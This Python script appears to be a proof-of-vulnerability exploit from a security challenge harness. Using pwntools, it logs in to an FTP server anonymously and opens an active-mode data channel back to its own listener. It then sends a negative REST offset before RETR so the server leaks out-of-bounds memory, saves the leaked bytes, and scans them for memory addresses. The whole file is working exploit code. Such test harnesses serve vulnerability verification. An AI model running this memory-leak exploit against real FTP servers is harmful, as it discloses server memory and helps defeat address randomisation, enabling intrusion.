import sys
import socket
import random
import time
import string
import base64
import os
import datetime
import string
import struct
import signal
import netifaces
import binascii

from threading import Thread

from pwn import *

pwd = ''
homedir = ''

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(0)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def get_interface_ip():
	intface = None

	try:
		intface = netifaces.ifaddresses('eth0')
	except:
		pass

	try:
		if intface == None:
			intface = netifaces.ifaddresses('enp0s3')
	except:
		print('[ERROR] Failed to find an interface')
		exit(1)

	ip = intface[netifaces.AF_INET][0]['addr']

	return ip

def data_thread(port):
	print('[INFO] Data thread created')

	client = listen(bindaddr="0.0.0.0", port=port)
	client.wait_for_connection()

	data = client.read(5000)
	client.close()

	print('[INFO] Data received from the server: %d bytes' %(len(data)))

	f = open('leakeddata.bin', 'wb')
	f.write(data)
	f.close()

def create_port(port):
	
	ip = get_interface_ip().split('.')

	pt = 'PORT '

	for x in ip:
		pt += x + ','

	pt += str(int(port/256)) + ','
	pt += str(port % 256) + '\r\n'

	print(pt)
	return pt.encode('utf-8')

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    p = remote(HOST, 21)
    
    listen_thread = Thread(target=data_thread,args=(59723,))
    listen_thread.start()
    time.sleep(.5)

    print(p.readline())
    p.send(b'USER anonymous\r\n')
    print(p.readline())
    p.send(b'PASS anon\r\n')
    print(p.readline())
    p.send(b'SYST\r\n')
    print(p.readline())
    p.send(b'TYPE I\r\n')
    print(p.readline())
    p.send(create_port(59723))
    print(p.readline())
    p.send(b'REST -100000\r\n')
    print(p.readline())
    
    p.send(b'RETR testfile\r\n')
    
    print(p.readline())
    
    listen_thread.join()

    p.send(b'QUIT\r\n')
    
    p.close()
    
    try:
    	f = open('leakeddata.bin', 'rb')
    except:
    	print('[FAIL] POV failed')
    	exit(0)

    data = bytearray(f.read())
    f.close()

    if len(data) != 4096:
    	print('[FAIL] POV failed')
    	exit(0)

    ## Scan until 6 consecutive non-null bytes are found followed by two null bytes
    count = 0
    total_addrs = 0

    for x in range(len(data)):
    	if data[x] != 0x00:
    		count += 1
    	else:
    		count = 0

    	if count == 6:
    		if data[x+1] == 0 and data[x+2] == 0:
    			addr = int.from_bytes(data[x-5:x+2], byteorder="little")
    			print('[ADDRESS] 0x%.8x' %addr)
    			total_addrs += 1
    		else:
    			count = 0

    	if total_addrs == 5:
    		break

    if total_addrs == 0:
    	print('[FAIL] POV failed')
    	exit(0)

    print('[SUCCESS] POV completed successfully')

if __name__ == '__main__':
    main()
